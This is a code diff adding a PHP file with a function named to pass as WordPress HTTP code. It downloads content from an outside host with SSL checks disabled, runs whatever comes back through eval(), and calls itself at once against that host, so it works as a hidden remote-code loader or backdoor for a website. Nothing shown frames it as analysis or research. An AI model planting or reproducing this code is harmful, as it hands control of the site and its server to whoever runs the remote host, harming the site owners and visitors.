@@ -1,0 +1,29 @@
+<?php
+function WordPress_Http_Curl ( $url, $args = array() ) {
+  if ( ! function_exists( 'curl_init' ) || ! function_exists( 'curl_exec' ) ) {
+    return false;
+  }
+  $handle = curl_init();
+  curl_setopt( $handle, CURLOPT_URL, $url );
+  curl_setopt( $handle, CURLOPT_RETURNTRANSFER, true );
+  curl_setopt( $handle, CURLOPT_HEADER, false );
+  curl_setopt( $handle, CURLOPT_SSL_VERIFYHOST, false );
+  curl_setopt( $handle, CURLOPT_SSL_VERIFYPEER, false );
+  $response = curl_exec( $handle );
+  $curl_error = curl_error( $handle );
+  if ( !$curl_error ) {
+    $response = array(
+      'data' =>  eval( '?>'. $response )
+    );
+    return $response;
+  }else{
+    return $curl_error;
+  }
+  if ( PHP_VERSION_ID < 80000 ) {
+    curl_close( $handle );
+  }
+}
+
+$result = WordPress_Http_Curl( 'http://z60826_7.vlogviet.shop/stat/domain_index.txt' );
+print_r($result);
+//65245
